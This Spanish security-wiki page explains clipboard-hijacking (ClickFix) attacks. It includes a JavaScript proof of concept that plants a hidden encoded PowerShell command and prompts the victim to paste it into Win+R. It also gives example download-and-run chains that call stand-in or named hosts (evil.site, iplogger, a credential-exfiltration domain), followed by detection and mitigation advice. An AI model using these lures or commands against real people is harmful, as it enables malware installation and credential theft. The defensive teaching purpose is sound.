# Ataques de Secuestro de Portapapeles (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues nada que no hayas copiado tú mismo." – un consejo antiguo pero aún válido

## Descripción General

El secuestro de portapapeles – también conocido como *pastejacking* – abusa del hecho de que los usuarios rutinariamente copian y pegan comandos sin inspeccionarlos. Una página web maliciosa (o cualquier contexto capaz de JavaScript, como una aplicación Electron o de escritorio) coloca programáticamente texto controlado por el atacante en el portapapeles del sistema. Las víctimas son alentadas, normalmente mediante instrucciones de ingeniería social cuidadosamente elaboradas, a presionar **Win + R** (diálogo de Ejecutar), **Win + X** (Acceso Rápido / PowerShell), o abrir un terminal y *pegar* el contenido del portapapeles, ejecutando inmediatamente comandos arbitrarios.

Debido a que **no se descarga ningún archivo y no se abre ningún adjunto**, la técnica elude la mayoría de los controles de seguridad de correo electrónico y contenido web que monitorean adjuntos, macros o ejecución directa de comandos. Por lo tanto, el ataque es popular en campañas de phishing que entregan familias de malware de uso común como NetSupport RAT, cargador Latrodectus o Lumma Stealer.

## Prueba de Concepto en JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Las campañas más antiguas usaban `document.execCommand('copy')`, las más nuevas dependen de la **Clipboard API** asíncrona (`navigator.clipboard.writeText`).

## El flujo ClickFix / ClearFake

1. El usuario visita un sitio con errores tipográficos o comprometido (por ejemplo, `docusign.sa[.]com`)
2. JavaScript **ClearFake** inyectado llama a un helper `unsecuredCopyToClipboard()` que almacena silenciosamente una línea de PowerShell codificada en Base64 en el portapapeles.
3. Instrucciones HTML le dicen a la víctima: *“Presione **Win + R**, pegue el comando y presione Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo que contiene un ejecutable legítimo más un DLL malicioso (carga lateral clásica de DLL).
5. El cargador descifra etapas adicionales, inyecta shellcode e instala persistencia (por ejemplo, tarea programada) – ejecutando en última instancia NetSupport RAT / Latrodectus / Lumma Stealer.

### Cadena de ejemplo de NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) busca en su directorio `msvcp140.dll`.
* El DLL malicioso resuelve dinámicamente las APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) a través de **curl.exe**, los desencripta usando una clave XOR rotativa `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el descargador JScript dentro de **cscript.exe**
3. Obtiene una carga útil MSI → deja caer `libcef.dll` además de una aplicación firmada → carga lateral de DLL → shellcode → Latrodectus.

### Lumma Stealer a través de MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada **mshta** lanza un script de PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` a través de `extrac32` y concatenación de archivos y finalmente ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.

## Detección y Caza

Los equipos azules pueden combinar la telemetría del portapapeles, la creación de procesos y el registro para identificar el abuso de pastejacking:

* Registro de Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene un historial de comandos **Win + R** – busque entradas inusuales en Base64 / ofuscadas.
* ID de Evento de Seguridad **4688** (Creación de Proceso) donde `ParentImage` == `explorer.exe` y `NewProcessName` en { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* ID de Evento **4663** para creaciones de archivos bajo `%LocalAppData%\Microsoft\Windows\WinX\` o carpetas temporales justo antes del evento sospechoso 4688.
* Sensores de portapapeles EDR (si están presentes) – correlacionar `Clipboard Write` seguido inmediatamente por un nuevo proceso de PowerShell.

## Mitigaciones

1. Dureza del navegador – deshabilitar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir un gesto del usuario.
2. Conciencia de seguridad – enseñar a los usuarios a *escribir* comandos sensibles o pegarlos primero en un editor de texto.
3. Modo de Lenguaje Restringido de PowerShell / Política de Ejecución + Control de Aplicaciones para bloquear líneas de comandos arbitrarias.
4. Controles de red – bloquear solicitudes salientes a dominios conocidos de pastejacking y C2 de malware.

## Trucos Relacionados

* El **Secuestro de Invitaciones de Discord** a menudo abusa del mismo enfoque ClickFix después de atraer a los usuarios a un servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referencias

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
